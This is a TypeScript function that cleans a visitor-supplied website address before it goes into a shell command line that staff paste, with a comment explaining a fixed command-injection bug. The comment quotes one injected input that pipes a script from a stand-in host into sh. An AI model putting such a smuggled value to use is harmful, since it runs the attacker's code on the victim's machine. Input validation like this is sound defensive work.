/**
 * Turns what a visitor typed into the audit form's website field into
 * "host/path", or null if it isn't a plain website address. Accepts bare
 * domains too — most people type "example.com", not a full URL.
 *
 * The result goes into the audit-request email's "Run: node audit.mjs …"
 * line, which gets pasted into a terminal, so the path is held to characters
 * that are safe both in a URL and in a shell. Before this, only the host was
 * checked: "example.com/x;curl evil.sh|sh" passed, and pasting the line would
 * have run the visitor's command. Query strings and fragments are dropped
 * (the audit doesn't need them); a % must be a real %XX escape, so cmd's
 * %VAR% expansion can't fire. Checked by scripts/check-website-input.mjs.
 */
export function normalizeWebsite(raw: string): string | null {
  const trimmed = raw
    .trim()
    .replace(/^https?:\/\//i, "")
    .replace(/[?#].*$/, "")
    .replace(/\/+$/, "");
  if (!trimmed) return null;
  const [host, ...rest] = trimmed.split("/");
  if (!/^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$/i.test(host)) {
    return null;
  }
  const path = rest.join("/");
  if (path && !/^(?:[a-z0-9._~\/-]|%[0-9a-f]{2})+$/i.test(path)) return null;
  return path ? `${host}/${path}` : host;
}
